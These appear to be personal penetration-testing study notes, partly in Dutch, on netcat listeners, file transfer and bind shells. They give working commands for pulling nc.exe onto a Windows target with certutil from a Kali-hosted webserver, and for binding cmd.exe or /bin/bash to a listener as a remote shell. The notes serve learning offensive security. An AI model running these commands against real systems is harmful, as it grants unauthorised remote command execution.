#### Bind & reserve shells 

- Netcat is a networking utility used to read and write data to network connections using TCP or UDP
- Netcat is available for both NIX and Windows operating systems, consequently making it extremely useful for cross-platform engagements 
- netcat utilizes a client-server communication architecture with two modules: 
	- **Client mode** - Netcat can be used in client mode to connect to any TCP/UDP port as well as a netcat listener (server)
	- **Server mode** - Netcat can be used to listen for connections from clients on a specific port 
- Netcat can be used by penetration testers to perform the following functionality: 
	- Banner grabbing 
	- Port scanning 
	- Transferring Files 
	- Bind/reverse shells 
- netcat manual: `man nc `




##### Setting up the Listener
connect to port: `nc target_ip target_port `
- `-nv`: no dns resolution and verbose output 
- `-nvu`: connect to udp port instead of tcp

1 set up listener - two ways to do this: 
	Set up webserver and download the file from the target host's browser 
	-  `python -m SimpleHTTPServer 80 `
	-  open browser and visit the webserver url: `http://kali-ip:80 ``
	Set up webserver and download the file from the target command prompt 
	- navigate to directory where I want to save the file `cd`
	- `certutil -urlcache -f http://kali_ip/nc.exe nc.exe`

2 set up listener: `nc -nvlp 1234` 
3 connect to listener (in command prompt on target desktop): `nc.exe -nv kali-ip  port `

Als je via target system de listner wil start dan run je daar in de commandprompt `nc -nvlp kali_ip port` en run je in je kali terminal `nc -nv target-ip port `

--

1. Establishing a listener on the attacker's system.
2. Connecting to the listener from the target system.

Step 1: Setting up the Listener
There are two ways to set up a listener on the attacker's system. 

**Method 1:** Set up a Webserver to Download the File from the Target Host's Browser

- Open a terminal on your Kali Linux machine.
- Run the following command to start a simple webserver on port 80:
	- `python -m SimpleHTTPServer 80`
- Open a web browser on the target system and visit the following URL:
	- `http://kali-ip:80`
   

**Method 2**: Set up a Webserver to Download the File from the Target Command Prompt
-  Open a terminal on your Kali Linux machine.
	- Navigate to the directory that contains the file we want to upload to the target
		- `cd /path/to/save/location/`
		- set up a simple webserver 
    
- Run the following command to download the nc.exe file from your target machine
	- `certutil -urlcache -f http://kali_ip/nc.exe nc.exe`
    


Step 2: Setting up the Listener on the Attacker's System

- Open a terminal on your Kali Linux machine.
- Run the following command to set up a Netcat listener on port 1234:
	- `nc -nvlp 1234`
    

Step 3: Connecting to the Listener from the Target System (Windows)
- Open a command prompt on the target system (Windows).
- Navigate to the directory where you downloaded the nc.exe file (if needed).
- Run the following command to connect to the Netcat listener on your Kali Linux machine:
	- `nc.exe -nv kali-ip 1234`
  

Note:
- If you wish to start the listener from the target system, run the following command in the target system's command prompt: `nc -nvlp kali_ip 1234`

And in your Kali terminal, run: `nc -nv target-ip 1234` 
    Replace "kali_ip" with the IP address of your Kali Linux machine and "target-ip" with the IP address of the target system.

`nc -nv` wordt gebruikt om om een actieve verbinding tot stand te brengen, terwijl `nc -nvlp` gebruikt wordt te luisteren naar inkomende verbindingen 

1. `nc -nvlp` (Listening Mode):
    - **-n**: It tells Netcat not to perform DNS resolution, which can speed up connection establishment.
    - **-v**: This option makes Netcat verbose, providing detailed output about the connection.
    - **-l**: This option specifies that Netcat should operate in listening mode, waiting for incoming connections.
    - **-p port**: You would typically specify the port number after `-p` to indicate on which port Netcat should listen for incoming connections. For example, `nc -nvlp 1234` listens on port 1234.

    - This command sets up Netcat to listen on port 1234 and wait for incoming connections. It's commonly used on the system that will receive incoming connections, like a server.
- 
1. `nc -nv` (Connecting Mode):
    - **target_ip target_port**: In this case, you specify the IP address of the target system and the port you want to connect to.
    - This command initiates an active connection to a remote system at `target_ip` on the specified `target_port`. It's used on the system that initiates the connection, often referred to as the client or attacker in some scenarios.

In summary, `nc -nvlp` is used on the system that is waiting for incoming connections (listener), while `nc -nv` is used on the system that initiates the connection to the listener. The listener sets up a server-like environment, while the connecting side acts as the client or attacker.

 netcat listener on udp port:  `nc -nvlup 1234 `  --> `nc -nvu 1234`


##### Setting up listener and connecting to listener (how to transfer files with netcat)


- The system you want to **transfer**/receive the files (to) needs to have the listener (`nc -nvlp`) set up 
- the system that is **sending** the file will be **connecting** to that netcat listener 



**Stap 6: Het Overzetten van de Netcat Executable naar het Windows Systeem**

1. Navigeer naar de '/usr/share/windows-binaries' directory op Kali Linux:

   `cd /usr/share/windows-binaries`

2. Start een HTTP-server met Python: (de folder waarin je server start wordt gehost in webserver)

   `python -m SimpleHTTPServer 80`

3. Identificeer het IP-adres van je Kali Linux-systeem:

   `ifconfig`

4. Navigeer naar het target-systeem.

5. Open een command prompt op het targetsysteem en voer het volgende commando uit om 'nc.exe' te downloaden van de Kali Linux HTTP-server:

   `certutil -urlcache -f http://[Kali-IP]/nc.exe nc.exe`

**Stap 7: Het Opzetten van een Netcat Listener**

6. Op de Kali Linux-machine, voer het volgende commando uit om een Netcat listener op te zetten:

   `nc -nvlp 1234`

7. Verbind vanaf het target-doelsysteem met de Netcat listener:

   `nc -nv [Kali-IP] 1234`



**Stap 9: Bestanden Overdragen met Netcat**

9. Netcat kan ook worden gebruikt om bestanden tussen de listener en de client over te dragen.

10. Maak een bestand genaamd 'test.txt' op de Kali Linux-machine:

    `echo "Hello, this was sent over with Netcat" >> test.txt`

11. Zet een Netcat listener op het target die het betstand moet ontvangen (en dus moet luisteren)
    `nc.exe -nvlp 1234 > test.txt`

12. Verbind vanaf de Kali Linux-machine met de listener en stuur de inhoud van 'test.txt':

    `nc -nv [Windows-IP] 1234 < test.txt`



### Bind Shells 

- A bind shell is a type of remote shell were the attacker connects directly to a listener on the target system, allowing for execution of commands on the target system
- A netcat listener can be set up to execute a specific executable like **cmd.exe** (windows) or **/bin/bash** (linux) when a client connects to the listener
- Reverse shell is better than bind shells. 
	- problems with bind shells?
		- you need netcat on target system
		- inbound traffic will be blocked by firewall (incoming traffic) 

![[Pasted image 20230906115157.png]]
					*Attacker connects to netcat listener on target *

BINDSHELL 

TARGET -- `nc.exe nc -nlvp port  -e cmd.exe` 
ATTACKER -- `nc -nv target_ip port ` 

###### How to set up bind shell
Terminal 1 (kali - attacker)
- go to directory that contains the netcat binary: `cd /usr/share/windows-binaries `
- set up webserver: `python -m SimpleHTTPServer 80 `
  Download the netcat file on target system 

Terminal on target system (windows)
- `certutil -urlcache -f http://[Kali-IP]/nc.exe nc.exe` 
- go into folder where the file is downloaded (`cd`)
 the target system needs to set up a netcat listener and needs to be configured to execute CMD.exe 
- set up netcat listener: `nc.exe -nvlp 1234 -e cmd.exe `
whenever the client connects to listener, cmd will be executed and the target or attacker system will be provided with command shell 

terminal (kali) to set up the bind shell 
- `nc -nv target_ip port `
![[Pasted image 20230906143025.png]]

![[1601538025320.png]]


Set up bind shell on linux system: 

on linux target system
- `nc -nvlp port -c /bin/bash `

On windows system (attacker)
- `nc.exe -nv  ip port `
- ls whoami getuid 










